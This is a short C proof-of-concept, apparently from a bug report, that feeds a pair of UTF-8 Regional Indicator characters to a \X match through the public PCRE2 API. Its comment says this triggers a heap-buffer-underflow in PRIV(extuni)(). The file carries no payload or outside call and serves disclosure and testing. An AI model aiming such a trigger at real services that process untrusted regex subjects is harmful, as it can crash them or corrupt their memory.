/* PoC: heap-buffer-underflow in PRIV(extuni)() when matching \X against a
 * subject that begins with two Regional Indicator characters (e.g. a
 * national-flag emoji pair). Reached entirely through the public pcre2
 * match API with a well-formed UTF-8 subject; no invalid-UTF handling is
 * required to hit the bug. */

#define PCRE2_CODE_UNIT_WIDTH 8
#include <pcre2.h>
#include <stdio.h>
#include <string.h>

int main(void)
{
  PCRE2_SPTR pattern = (PCRE2_SPTR)"\\X";

  /* U+1F1E6 REGIONAL INDICATOR SYMBOL LETTER A, encoded as UTF-8, repeated
   * twice. This is a perfectly ordinary, valid UTF-8 subject string. */
  unsigned char subject[] = {
    0xF0, 0x9F, 0x87, 0xA6,   /* U+1F1E6 */
    0xF0, 0x9F, 0x87, 0xA6    /* U+1F1E6 */
  };

  int errorcode;
  PCRE2_SIZE erroroffset;

  pcre2_code *re = pcre2_compile(pattern, PCRE2_ZERO_TERMINATED, PCRE2_UTF,
    &errorcode, &erroroffset, NULL);
  if (re == NULL)
    {
    unsigned char buf[256];
    pcre2_get_error_message(errorcode, buf, sizeof(buf));
    fprintf(stderr, "compile failed at %lu: %s\n", (unsigned long)erroroffset, buf);
    return 1;
    }

  pcre2_match_data *md = pcre2_match_data_create(4, NULL);

  int rc = pcre2_match(re, (PCRE2_SPTR)subject, sizeof(subject), 0, 0, md, NULL);

  printf("match rc = %d\n", rc);

  pcre2_match_data_free(md);
  pcre2_code_free(re);
  return 0;
}
